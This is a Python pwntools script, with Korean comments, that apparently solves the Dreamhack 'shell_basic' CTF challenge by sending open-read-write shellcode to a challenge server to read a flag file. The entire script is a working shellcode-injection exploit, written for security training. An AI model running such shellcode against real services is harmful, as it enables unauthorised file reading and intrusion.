from pwn import *

# 1. 접속 정보 설정
# 문제 페이지의 "접속 정보 보기"에서 제공하는 Host와 Port를 입력하세요.
host = 'host8.dreamhack.games' # 예시입니다. 실제 주소로 수정하세요.
port = 23523                   # 예시입니다. 실제 포트로 수정하세요.

r = remote(host, port)

# 2. 아키텍처 설정 (x86-64)
context.arch = 'amd64'

# 3. 셸코드 작성 (우리가 검증했던 그 로직입니다)
path = "/home/shell_basic/flag_name_is_loooooong"

# pwntools의 shellcraft를 이용하면 어셈블리를 직접 짜지 않아도 
# 우리가 원했던 ORW(Open, Read, Write)를 정확히 생성해줍니다.
shellcode = shellcraft.open(path)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

# 4. 셸코드 컴파일 (기계어로 변환)
payload = asm(shellcode)

# 5. 서버로 전송
# 문제 서버가 "shellcode: " 처럼 입력을 기다리고 있다면 sendline을 사용합니다.
print(r.recvuntil(b"shellcode: ")) # 서버의 안내 메시지까지 읽기
r.sendline(payload)

# 6. 플래그 확인
print("--- Flag ---")
print(r.recvall().decode()) # 서버가 보내주는 모든 데이터를 출력